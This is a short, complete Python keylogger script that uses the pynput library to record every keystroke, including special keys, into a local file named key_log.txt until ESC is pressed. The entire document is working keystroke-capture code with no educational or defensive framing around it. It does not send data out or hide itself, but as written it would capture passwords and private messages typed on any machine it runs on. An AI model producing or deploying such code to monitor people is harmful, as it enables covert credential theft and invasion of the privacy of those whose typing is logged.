from pynput import keyboard
import os

log_file = "key_log.txt"

# Create or clear the log file at start
with open(log_file, "w") as file:
    file.write("Keylogger Started...\n")

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys
        with open(log_file, "a") as file:
            file.write(f"[{key.name}]")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the listener when ESC is pressed
        return False

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
